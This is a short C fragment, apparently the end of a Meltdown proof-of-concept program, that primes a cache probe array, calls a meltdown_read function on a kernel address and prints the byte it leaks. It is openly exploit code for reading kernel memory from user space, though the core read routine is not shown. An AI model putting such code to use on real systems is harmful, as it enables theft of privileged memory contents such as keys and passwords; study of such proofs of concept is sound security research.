    for (int i = 0; i < 256; i++) {
        probe[i * 4096] = 1;
    }

    printf("Attempting to read kernel memory...\n");
    char result = meltdown_read(0);
    printf("First byte of kernel address: 0x%02x ('%c')\n", result, result);
    return 0;
